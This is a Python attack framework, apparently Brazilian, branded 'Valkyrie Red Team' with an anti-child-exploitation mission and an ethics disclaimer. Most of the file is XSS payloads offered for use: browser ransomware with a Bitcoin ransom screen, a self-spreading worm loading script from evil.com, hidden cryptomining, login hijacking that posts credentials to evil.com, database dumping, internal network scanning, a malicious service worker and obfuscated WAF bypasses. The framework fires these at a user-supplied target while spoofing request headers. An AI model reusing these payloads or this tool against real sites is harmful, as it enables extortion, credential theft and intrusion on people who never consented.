#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Framework Pro - Edição Elite
Valkyrie Red Team - Combatendo a pedofilia na deep web
Versão: 5.0
"""

import os
import sys
import requests
import urllib.parse
import base64
import json
import random
import webbrowser
from time import sleep
from colorama import Fore, Style, init
from datetime import datetime, timedelta

# Inicializa colorama
init()

# Banner atualizado
BANNER = f"""
{Fore.RED}
██╗   ██╗ █████╗ ██╗     ██╗  ██╗██╗   ██╗██████╗ ███████╗
██║   ██║██╔══██╗██║     ██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝
██║   ██║███████║██║     █████╔╝  ╚████╔╝ ██████╔╝█████╗  
╚██╗ ██╔╝██╔══██║██║     ██╔═██╗   ╚██╔╝  ██╔══██╗██╔══╝  
 ╚████╔╝ ██║  ██║███████╗██║  ██╗   ██║   ██║  ██║███████╗
  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝
{Fore.YELLOW}
  XSS Framework Pro - Edição Elite | {Fore.CYAN}Valkyrie Red Team{Style.RESET_ALL}
{Fore.MAGENTA}
  "Nenhuma criança merece sofrer. Nós somos a justiça digital."
{Style.RESET_ALL}
"""

# Configurações
LOCAL_SITE_PORT = 8080
BITCOIN_ADDRESS = "1ValkyrieAntiPed0xBTC"
CONTACT_EMAIL = "valkyrie@safe-mail.net"
DESTRUCTION_TIME = 48  # Horas

# Categorias de payloads elite
PAYLOAD_CATEGORIES = {
    '1': {
        'name': 'Ransomware Real (Web Crypto)',
        'payloads': [
            """<script>
// Ransomware com timer de destruição
async function encryptAllData() {
    const key = await crypto.subtle.generateKey({name: "AES-GCM", length: 256}, true, ["encrypt"]);
    const data = {
        cookies: document.cookie,
        localStorage: Object.assign({}, localStorage),
        forms: Array.from(document.forms).map(form => ({
            id: form.id,
            inputs: Array.from(form.elements).map(i => ({name: i.name, value: i.value}))
        })),
        html: document.body.innerHTML
    };
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
        {name: "AES-GCM", iv},
        key,
        new TextEncoder().encode(JSON.stringify(data))
    );
    
    // Armazena dados cifrados
    localStorage.setItem('encrypted_data', JSON.stringify({
        data: Array.from(new Uint8Array(encrypted)),
        iv: Array.from(iv),
        timestamp: new Date().getTime()
    }));
    
    // Exibe tela de resgate
    document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#f00;text-align:center;padding-top:50px;font-family:Arial">
        <img src="https://i.imgur.com/JqYeZvn.png" style="height:150px">
        <h1 style="font-size:2.5em;margin:20px 0">SEUS DADOS FORAM CIFRADOS!</h1>
        <p style="font-size:1.2em;max-width:800px;margin:0 auto">
            Todos os seus dados de navegação, formulários e cookies foram criptografados com AES-256.<br>
            Você tem ${DESTRUCTION_TIME} horas para pagar o resgate ou os dados serão perdidos permanentemente.
        </p>
        <div style="background:#111;padding:20px;margin:30px auto;width:80%;max-width:600px;border-radius:5px">
            <p style="color:#0f0">Envie 0.5 BTC para:</p>
            <p style="word-break:break-all;font-size:1.5em">${BITCOIN_ADDRESS}</p>
            <p style="color:#0f0">E envie o comprovante para:</p>
            <p style="word-break:break-all">${CONTACT_EMAIL}</p>
        </div>
        <div id="countdown" style="font-size:1.5em;color:#ff0"></div>
    </div>`;
    
    // Timer de destruição
    const deadline = new Date().getTime() + (${DESTRUCTION_TIME} * 60 * 60 * 1000);
    setInterval(() => {
        const now = new Date().getTime();
        const diff = deadline - now;
        const hours = Math.floor(diff / (1000 * 60 * 60));
        const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        document.getElementById('countdown').innerHTML = `Tempo restante: ${hours}h ${mins}m`;
        
        if (diff < 0) {
            localStorage.removeItem('encrypted_data');
            document.body.innerHTML += `<p style="color:#f00;font-size:1.5em">SEUS DADOS FORAM DESTRUÍDOS!</p>`;
        }
    }, 1000);
}
encryptAllData().catch(e => console.error(e));
</script>"""
        ]
    },
    '2': {
        'name': 'Worm XSS (Auto-replicação)',
        'payloads': [
            """<script>
// Worm para WordPress
if (location.href.includes('wp-admin')) {
    fetch('/wp-admin/post-new.php', {
        method: 'POST',
        body: 'post_title=XSS+Worm&content=<script src="//evil.com/worm.js"><\\/script>&publish=Publicar',
        credentials: 'include'
    });
} else if (document.forms.length > 0) {
    // Injeta em todos os formulários
    document.forms.forEach(form => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'xss_payload';
        input.value = '<script src="//evil.com/worm.js"><\\/script>';
        form.appendChild(input);
    });
}
// Propaga via localStorage
if (localStorage) {
    localStorage.setItem('xss_worm', '<script src="//evil.com/worm.js"><\\/script>');
}
</script>"""
        ]
    },
    '3': {
        'name': 'Cryptojacking (Mineração oculta)',
        'payloads': [
            """<script>
// Mineração discreta com fallback
function startMiner() {
    const script = document.createElement('script');
    script.src = 'https://coinhive.com/lib/miner.min.js';
    script.onload = () => {
        const miner = new CoinHive.Anonymous('YOUR_SITE_KEY', {
            throttle: 0.5,
            threads: navigator.hardwareConcurrency || 2
        });
        miner.start();
        
        // Ocultar uso de CPU
        window.onblur = () => miner.setThrottle(0.9);
        window.onfocus = () => miner.setThrottle(0.5);
    };
    document.head.appendChild(script);
}

// Fallback para WebAssembly se CoinHive estiver bloqueado
if (!window.CoinHive) {
    const wasmCode = '...'; // Código WASM compactado
    const wasmModule = new WebAssembly.Module(base64ToArrayBuffer(wasmCode));
    const wasmInstance = new WebAssembly.Instance(wasmModule);
    wasmInstance.exports.startMiner();
}
startMiner();
</script>"""
        ]
    },
    '4': {
        'name': 'Phishing Avançado (Clone de Login)',
        'payloads': [
            """<script>
// Detecta páginas de login e clona
if (document.querySelector('input[type="password"]')) {
    const originalHTML = document.body.innerHTML;
    document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#fff;text-align:center;padding-top:50px">
        <h1 style="color:#0f0">Atualização de Segurança Requerida</h1>
        <p>Por favor, faça login novamente para verificar sua identidade</p>
        ${originalHTML}
        <img src="https://i.imgur.com/secure.png" style="height:50px;margin-top:20px">
    </div>`;
    
    // Intercepta credenciais
    document.forms[0].onsubmit = function(e) {
        e.preventDefault();
        const creds = {
            user: this.username.value,
            pass: this.password.value,
            url: location.href,
            time: new Date()
        };
        fetch('https://evil.com/log', {
            method: 'POST',
            body: JSON.stringify(creds)
        }).then(() => {
            this.submit(); // Envia para o site real depois de capturar
        });
    };
}
</script>"""
        ]
    },
    '5': {
        'name': 'Ataque a Banco de Dados (SQLi via XSS)',
        'payloads': [
            """<script>
// Explora SQLi em painéis admin
if (location.pathname.includes('admin')) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '/admin/query.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.withCredentials = true;
    xhr.send('query=SELECT+*+FROM+users');
    xhr.onload = function() {
        fetch('https://evil.com/dump', {
            method: 'POST',
            body: xhr.responseText
        });
    };
}
</script>"""
        ]
    },
    '6': {
        'name': 'Persistência (Service Workers)',
        'payloads': [
            """<script>
// Registra Service Worker malicioso
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('sw.js').then(reg => {
        console.log('SW registered:', reg);
    });
}

// SW.js conteria:
/*
self.addEventListener('install', e => {
    self.skipWaiting();
});
self.addEventListener('activate', e => {
    clients.claim();
});
self.addEventListener('fetch', e => {
    // Injeta payload em todas as respostas
    e.respondWith(
        fetch(e.request).then(response => {
            const newHeaders = new Headers(response.headers);
            newHeaders.set('X-XSS-Payload', '<script>maliciousCode()<\\/script>');
            return new Response(response.body, {
                status: response.status,
                headers: newHeaders
            });
        })
    );
});
*/
</script>"""
        ]
    },
    '7': {
        'name': 'SSRF / Rede Interna',
        'payloads': [
            """<script>
// Varredura de rede interna
const internalIPs = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
const foundDevices = [];

internalIPs.forEach(ip => {
    fetch(`http://${ip}/`, {mode: 'no-cors'})
        .then(() => foundDevices.push(ip))
        .catch(() => {});
});

// Envia resultados após 10 segundos
setTimeout(() => {
    if (foundDevices.length > 0) {
        fetch('https://evil.com/internal', {
            method: 'POST',
            body: JSON.stringify(foundDevices)
        });
    }
}, 10000);
</script>"""
        ]
    },
    '8': {
        'name': 'Bypass WAF (Obfuscação)',
        'payloads': [
            """<script>
// Payload ofuscado com múltiplas técnicas
const payload = [106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,39,88,83,83,39,41]
    .map(c => String.fromCharCode(c)).join('');
const iframe = document.createElement('iframe');
iframe.srcdoc = `<svg/onload=eval(atob('${btoa(payload)}'))>`;
document.body.appendChild(iframe);
</script>""",
            """<div data-xss="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;"></div>
<script>
document.querySelector('[data-xss]').innerHTML = unescape(document.querySelector('[data-xss]').getAttribute('data-xss'));
</script>"""
        ]
    }
}

# Lista de user-agents para randomização
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
]

def print_banner():
    """Exibe o banner atualizado"""
    print(BANNER)
    print(f"{Fore.CYAN}  [ Valkyrie Red Team - Combatendo a exploração infantil online ]{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  ATENÇÃO: Use este framework apenas para testes legais em sistemas que você possui.{Style.RESET_ALL}\n")

def show_main_menu():
    """Mostra o menu principal"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════╗")
    print(f"║       {Fore.YELLOW}XSS FRAMEWORK PRO - EDIÇÃO ELITE{Fore.CYAN}               ║")
    print(f"╠════════════════════════════════════════════════════╣")
    print(f"║ {Fore.GREEN}1. {Fore.WHITE}Ransomware Real (Web Crypto + Dados){Fore.CYAN}         ║")
    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Worm XSS (Auto-replicação){Fore.CYAN}                   ║")
    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Cryptojacking (Mineração oculta){Fore.CYAN}             ║")
    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Phishing Avançado (Clone de Login){Fore.CYAN}           ║")
    print(f"║ {Fore.GREEN}5. {Fore.WHITE}Ataque a Banco de Dados (SQLi via XSS){Fore.CYAN}       ║")
    print(f"║ {Fore.GREEN}6. {Fore.WHITE}Persistência (Service Workers){Fore.CYAN}               ║")
    print(f"║ {Fore.GREEN}7. {Fore.WHITE}SSRF / Rede Interna{Fore.CYAN}                         ║")
    print(f"║ {Fore.GREEN}8. {Fore.WHITE}Bypass WAF (Obfuscação){Fore.CYAN}                     ║")
    print(f"║ {Fore.GREEN}9. {Fore.WHITE}Iniciar Site de Documentação{Fore.CYAN}               ║")
    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Sair{Fore.CYAN}                                       ║")
    print(f"╚════════════════════════════════════════════════════╝{Style.RESET_ALL}")

def get_random_user_agent():
    """Retorna um user-agent aleatório"""
    return random.choice(USER_AGENTS)

def test_xss(url, param, payload, method='GET', data=None):
    """Testa um payload XSS específico"""
    try:
        headers = {
            'User-Agent': get_random_user_agent(),
            'X-Forwarded-For': f'192.168.{random.randint(1, 255)}.{random.randint(1, 255)}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        if method.upper() == 'GET':
            params = {param: payload}
            response = requests.get(url, params=params, headers=headers, timeout=20)
        else:
            data = {param: payload} if data is None else data
            response = requests.post(url, data=data, headers=headers, timeout=20)
        
        if payload in response.text:
            return True, response.url
        return False, response.url
        
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
        return False, None

def create_custom_payload():
    """Cria um payload personalizado com base no tipo"""
    print(f"\n{Fore.YELLOW}[*] Criando Payload Personalizado{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1. Ransomware Personalizado")
    print(f"2. Phishing Avançado")
    print(f"3. Worm de Propagação")
    print(f"4. Mineração de Criptomoeda")
    choice = input(f"{Fore.YELLOW}[?] Selecione o tipo (1-4): {Style.RESET_ALL}")
    
    if choice == '1':
        bitcoin = input(f"{Fore.CYAN}[?] Endereço Bitcoin: {Style.RESET_ALL}") or BITCOIN_ADDRESS
        email = input(f"{Fore.CYAN}[?] Email de contato: {Style.RESET_ALL}") or CONTACT_EMAIL
        time = input(f"{Fore.CYAN}[?] Horas até destruição: {Style.RESET_ALL}") or DESTRUCTION_TIME
        
        return f"""<script>
async function encryptAllData() {{
    const key = await crypto.subtle.generateKey({{name: "AES-GCM", length: 256}}, true, ["encrypt"]);
    const data = {{
        cookies: document.cookie,
        localStorage: Object.assign({{}}, localStorage),
        forms: Array.from(document.forms).map(form => ({{
            id: form.id,
            inputs: Array.from(form.elements).map(i => ({{name: i.name, value: i.value}}))
        }})),
        html: document.body.innerHTML
    }};
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
        {{name: "AES-GCM", iv}},
        key,
        new TextEncoder().encode(JSON.stringify(data)))
    );
    
    localStorage.setItem('encrypted_data', JSON.stringify({{
        data: Array.from(new Uint8Array(encrypted)),
        iv: Array.from(iv),
        timestamp: new Date().getTime()
    }}));
    
    document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#f00;text-align:center;padding-top:50px">
        <h1>SEUS DADOS FORAM CIFRADOS!</h1>
        <p>Envie 0.5 BTC para ${bitcoin} e email para ${email}</p>
        <p>Tempo restante: <span id="timer">{time}:00:00</span></p>
    </div>`;
    
    const deadline = new Date().getTime() + ({time} * 60 * 60 * 1000);
    setInterval(() => {{
        const diff = deadline - new Date().getTime();
        const hours = Math.floor(diff / (1000 * 60 * 60));
        const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        document.getElementById('timer').innerHTML = `${{hours}}:${{mins}}`;
    }}, 1000);
}}
encryptAllData();
</script>"""
    
    elif choice == '2':
        target = input(f"{Fore.CYAN}[?] URL do site a clonar: {Style.RESET_ALL}")
        return f"""<script>
if (location.href.includes('login')) {{
    fetch('{target}')
        .then(r => r.text())
        .then(html => {{
            document.body.innerHTML = html;
            document.forms[0].onsubmit = function(e) {{
                e.preventDefault();
                const creds = {{
                    user: this.username.value,
                    pass: this.password.value,
                    url: location.href
                }};
                fetch('https://evil.com/log', {{
                    method: 'POST',
                    body: JSON.stringify(creds)
                }});
                alert('Login falhou. Tente novamente.');
            }};
        }});
}}
</script>"""
    
    elif choice == '3':
        return """<script>
// Worm para redes sociais
if (location.href.includes('post') || location.href.includes('comment')) {
    const payload = '<script src="//evil.com/worm.js"><\\/script>';
    if (document.querySelector('textarea')) {
        document.querySelector('textarea').value = payload;
        document.querySelector('form').submit();
    }
}
</script>"""
    
    elif choice == '4':
        return """<script>
// Mineração com detecção de navegador
const minerCode = '...'; // Código do miner compactado
if (navigator.hardwareConcurrency > 2) {
    const script = document.createElement('script');
    script.textContent = minerCode;
    document.head.appendChild(script);
}
</script>"""
    
    else:
        print(f"{Fore.RED}[!] Opção inválida{Style.RESET_ALL}")
        return None

def start_documentation_site():
    """Inicia o site de documentação local"""
    print(f"{Fore.YELLOW}[*] Iniciando site de documentação em http://localhost:{LOCAL_SITE_PORT}{Style.RESET_ALL}")
    
    # Cria a pasta do site se não existir
    site_dir = os.path.join(os.path.dirname(__file__), 'site')
    if not os.path.exists(site_dir):
        os.makedirs(site_dir)
    
    # Cria os arquivos do site
    with open(os.path.join(site_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write(f"""<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Valkyrie Red Team - XSS Framework Pro</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
</head>
<body>
    <video autoplay muted loop id="bgVideo">
        <source src="bg.mp4" type="video/mp4">
    </video>
    
    <div class="container">
        <header>
            <img src="assets/logo.png" alt="Valkyrie Logo" class="logo">
            <h1>XSS Framework Pro</h1>
            <h2>Edição Elite - Valkyrie Red Team</h2>
        </header>
        
        <nav>
            <ul>
                <li><a href="#about">Sobre</a></li>
                <li><a href="#features">Recursos</a></li>
                <li><a href="#mission">Missão</a></li>
                <li><a href="#ethics">Ética</a></li>
            </ul>
        </nav>
        
        <section id="about">
            <h3>SOBRE O FRAMEWORK</h3>
            <div class="content-box">
                <p>O XSS Framework Pro é uma ferramenta avançada para testes de penetração e pesquisa em segurança web, desenvolvida pelo Valkyrie Red Team.</p>
                <p>Esta edição elite inclui técnicas avançadas de exploração XSS para ajudar a identificar vulnerabilidades críticas em sistemas web.</p>
            </div>
        </section>
        
        <section id="features">
            <h3>RECURSOS PRINCIPAIS</h3>
            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-icon">🔐</div>
                    <h4>Ransomware Web</h4>
                    <p>Criptografia real de dados do cliente usando Web Crypto API com timer de destruição.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">🦠</div>
                    <h4>Auto-propagação</h4>
                    <p>Técnicas de worm XSS para demonstração de vulnerabilidades persistentes.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">🛡</div>
                    <h4>Bypass de WAF</h4>
                    <p>Payloads ofuscados para contornar sistemas de detecção de intrusão.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">📡</div>
                    <h4>SSRF Interno</h4>
                    <p>Exploração de redes internas através do navegador da vítima.</p>
                </div>
            </div>
        </section>
        
        <section id="mission">
            <h3>NOSSA MISSÃO</h3>
            <div class="content-box mission-box">
                <p>O Valkyrie Red Team é um grupo de hackers éticos dedicado a combater a exploração infantil na deep web.</p>
                <p>Nós desenvolvemos ferramentas avançadas para:</p>
                <ul>
                    <li>Identificar e reportar sites de abuso infantil</li>
                    <li>Desenvolver técnicas para derrubar redes de exploração</li>
                    <li>Treinar agências de aplicação da lei em técnicas de OSINT</li>
                    <li>Promover uma internet mais segura para crianças</li>
                </ul>
                <p class="quote">"Nenhuma criança merece sofrer. Nós somos a justiça digital."</p>
            </div>
        </section>
        
        <section id="ethics">
            <h3>USO ÉTICO</h3>
            <div class="content-box warning-box">
                <p>⚠️ ESTA FERRAMENTA DEVE SER USADA APENAS PARA:</p>
                <ul>
                    <li>Testes de penetração autorizados</li>
                    <li>Pesquisa em segurança cibernética</li>
                    <li>Defesa de sistemas contra ataques reais</li>
                </ul>
                <p>O uso não autorizado desta ferramenta é ilegal e contra os princípios do Valkyrie Red Team.</p>
                <p>Nós não toleramos qualquer uso malicioso desta tecnologia.</p>
            </div>
        </section>
        
        <footer>
            <p>© 2023 Valkyrie Red Team | Todos os direitos reservados</p>
            <p>Contato: valkyrie@safe-mail.net</p>
            <div class="social-icons">
                <a href="#"><img src="assets/github.png" alt="GitHub"></a>
                <a href="#"><img src="assets/twitter.png" alt="Twitter"></a>
                <a href="#"><img src="assets/keybase.png" alt="Keybase"></a>
            </div>
        </footer>
    </div>
    
    <script src="script.js"></script>
</body>
</html>""")

    with open(os.path.join(site_dir, 'style.css'), 'w', encoding='utf-8') as f:
        f.write("""body {
    margin: 0;
    padding: 0;
    font-family: 'Roboto', sans-serif;
    color: #fff;
    overflow-x: hidden;
}

#bgVideo {
    position: fixed;
    right: 0;
    bottom: 0;
    min-width: 100%;
    min-height: 100%;
    z-index: -1;
    opacity: 0.3;
}

.container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 20px;
}

header {
    text-align: center;
    margin: 50px 0;
}

.logo {
    height: 150px;
    margin-bottom: 20px;
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0% { transform: scale(1); }
    50% { transform: scale(1.05); }
    100% { transform: scale(1); }
}

h1, h2, h3, h4 {
    font-family: 'Orbitron', sans-serif;
}

h1 {
    font-size: 3em;
    margin: 10px 0;
    color: #f06;
    text-shadow: 0 0 10px rgba(255,0,102,0.7);
}

h2 {
    font-size: 1.5em;
    margin: 0;
    color: #0cf;
}

h3 {
    font-size: 2em;
    margin: 40px 0 20px;
    color: #f06;
    border-bottom: 2px solid #0cf;
    padding-bottom: 10px;
}

nav ul {
    display: flex;
    justify-content: center;
    list-style: none;
    padding: 0;
    margin: 30px 0;
    background: rgba(0,0,0,0.7);
    border-radius: 50px;
    padding: 15px;
}

nav li {
    margin: 0 15px;
}

nav a {
    color: #fff;
    text-decoration: none;
    font-family: 'Orbitron', sans-serif;
    padding: 10px 20px;
    border-radius: 20px;
    transition: all 0.3s;
}

nav a:hover {
    background: #f06;
    color: #000;
}

.content-box {
    background: rgba(0,0,0,0.7);
    padding: 30px;
    border-radius: 10px;
    margin-bottom: 30px;
    line-height: 1.6;
}

.features-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}

.feature-card {
    background: rgba(0,0,0,0.7);
    padding: 20px;
    border-radius: 10px;
    transition: transform 0.3s;
}

.feature-card:hover {
    transform: translateY(-10px);
    box-shadow: 0 10px 20px rgba(255,0,102,0.5);
}

.feature-icon {
    font-size: 2.5em;
    margin-bottom: 15px;
}

.mission-box {
    border-left: 5px solid #0cf;
}

.warning-box {
    border-left: 5px solid #f06;
    animation: warningPulse 2s infinite;
}

@keyframes warningPulse {
    0% { box-shadow: 0 0 0 0 rgba(255,0,102,0.4); }
    70% { box-shadow: 0 0 0 15px rgba(255,0,102,0); }
    100% { box-shadow: 0 0 0 0 rgba(255,0,102,0); }
}

.quote {
    font-style: italic;
    text-align: center;
    margin-top: 30px;
    font-size: 1.2em;
    color: #0cf;
}

footer {
    text-align: center;
    margin-top: 50px;
    padding: 20px;
    background: rgba(0,0,0,0.7);
    border-radius: 10px;
}

.social-icons {
    margin-top: 20px;
}

.social-icons img {
    height: 30px;
    margin: 0 10px;
    transition: transform 0.3s;
}

.social-icons img:hover {
    transform: scale(1.2);
}

@media (max-width: 768px) {
    h1 {
        font-size: 2em;
    }
    
    nav ul {
        flex-direction: column;
        align-items: center;
    }
    
    nav li {
        margin: 10px 0;
    }
}""")

    with open(os.path.join(site_dir, 'script.js'), 'w', encoding='utf-8') as f:
        f.write("""// Efeitos interativos para o site
document.addEventListener('DOMContentLoaded', function() {
    // Efeito de digitação no título
    const title = document.querySelector('h1');
    const originalText = title.textContent;
    title.textContent = '';
    
    let i = 0;
    const typingEffect = setInterval(() => {
        title.textContent += originalText[i];
        i++;
        if (i === originalText.length) clearInterval(typingEffect);
    }, 100);
    
    // Animação de scroll suave
    document.querySelectorAll('nav a').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            e.preventDefault();
            const targetId = this.getAttribute('href');
            const targetElement = document.querySelector(targetId);
            
            window.scrollTo({
                top: targetElement.offsetTop - 100,
                behavior: 'smooth'
            });
        });
    });
    
    // Efeito parallax
    window.addEventListener('scroll', function() {
        const scrollPosition = window.pageYOffset;
        const video = document.getElementById('bgVideo');
        video.style.transform = 'translateY(' + scrollPosition * 0.5 + 'px)';
    });
    
    // Mostrar elementos conforme scroll
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
            }
        });
    }, { threshold: 0.1 });
    
    document.querySelectorAll('.feature-card, .content-box').forEach(el => {
        el.classList.add('fade-in');
        observer.observe(el);
    });
});""")

    # Tenta iniciar o servidor Python simples
    try:
        os.chdir(site_dir)
        webbrowser.open(f'http://localhost:{LOCAL_SITE_PORT}')
        os.system(f'python -m http.server {LOCAL_SITE_PORT}')
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao iniciar servidor: {e}{Style.RESET_ALL}")

def main():
    print_banner()
    
    # Verifica se tem argumentos de linha de comando
    if len(sys.argv) < 3:
        url = input(f"{Fore.CYAN}[?] Digite a URL alvo (ex: http://site.com/vulneravel.php): {Style.RESET_ALL}")
        param = input(f"{Fore.CYAN}[?] Digite o parâmetro a testar (ex: busca): {Style.RESET_ALL}")
    else:
        url = sys.argv[1]
        param = sys.argv[2]
    
    while True:
        show_main_menu()
        choice = input(f"\n{Fore.YELLOW}[?] Selecione uma opção (0-9): {Style.RESET_ALL}")
        
        if choice == '0':
            print(f"{Fore.YELLOW}[*] Saindo...{Style.RESET_ALL}")
            break
            
        elif choice in PAYLOAD_CATEGORIES:
            category = PAYLOAD_CATEGORIES[choice]
            print(f"\n{Fore.CYAN}=== TESTANDO CATEGORIA: {category['name']} ==={Style.RESET_ALL}")
            
            for i, payload in enumerate(category['payloads'], 1):
                print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
                vulnerable, target_url = test_xss(url, param, payload)
                
                if vulnerable:
                    print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
                    print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
                sleep(0.5)
            
            print(f"\n{Fore.YELLOW}[*] Teste da categoria {category['name']} concluído!{Style.RESET_ALL}")
        
        elif choice == '9':
            start_documentation_site()
        
        else:
            print(f"{Fore.RED}[!] Opção inválida!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
